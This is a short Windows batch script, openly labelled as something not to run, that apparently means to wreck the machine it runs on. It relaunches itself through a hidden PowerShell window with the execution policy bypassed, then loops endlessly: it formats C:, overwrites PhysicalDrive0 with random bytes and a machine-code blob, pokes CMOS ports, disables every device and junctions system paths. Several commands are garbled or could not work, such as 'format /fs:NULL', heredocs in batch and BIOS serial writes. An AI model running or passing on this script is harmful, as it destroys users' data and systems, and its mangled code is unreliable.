rem PLEASE DO NOT RUN THIS BATCH FILE!!! I AM NOT RESPONSIBLE FOR BROKEN PC's
@echo off

if not "%1"=="bios_level" (
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
        $code = @'
        [DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();
        [DllImport(\"advapi32.dll\")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
        [DllImport(\"advapi32.dll\")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TOKEN_PRIVILEGES p,uint l,IntPtr p,IntPtr r);
        public struct TOKEN_PRIVILEGES{public uint Count;public long Luid;public uint Attr;}
        public const uint SE_PRIVILEGE_ENABLED=0x2;
        public const string SE_SHUTDOWN_NAME=\"SeShutdownPrivilege\";
        public const uint TOKEN_ADJUST_PRIVILEGES=0x20;
        public const uint TOKEN_QUERY=0x8;
'@
        Add-Type -MemberDefinition $code -Name Win32 -Namespace System
        $proc = [System.Diagnostics.Process]::GetCurrentProcess()
        $hdl = $proc.Handle
        Invoke-Expression 'cmd /c start /trustlevel:0x40000 %~s0 bios_level'
    " >nul 2>&1
    exit /b
)

:RIP

fsutil file createnew C:\wormhole\portal.sys 1073741824 >nul 2>&1
mklink /j C:\Windows\System32\drivers\etc\hosts C:\wormhole\portal.sys >nul 2>&1
mklink /j C:\wormhole\portal.sys C:\Windows >nul 2>&1

set /a entropy=%random%^%random%^%random%
for /l %%i in (1,1,1000000) do set /a entropy=entropy^!random!

echo 0F 0B | xxd -r -p | debug >nul 2>&1

debug >nul 2>&1 <<EOF
o 70 2e
o 71 ff
o 70 2f
o 71 ff
q
EOF

for /l %%c in (1,1,255) do (
    devcon disable * >nul 2>&1
    devcon enable * >nul 2>&1
)

wmic process call create "cmd /c echo y| format c: /fs:NULL /x /p:3" >nul 2>&1
wmic bios set SerialNumber="CORRUPTED" >nul 2>&1
wmic path win32_physicalmedia where "MediaType like '%SSD%'" call write 0,0,0 >nul 2>&1


set "chars=0123456789ABCDEF"
for /l %%s in (1,1,100000) do (
    set /a r=!random! %% 65536
    echo !chars:~%r%,1! >> C:\zero.bin
    type C:\zero.bin > \\.\PhysicalDrive0
)


echo 5E 1F 7C 00 00 48 C7 C0 3C 00 00 00 0F 05 | xxd -r -p > \\.\PhysicalDrive0

goto RIP
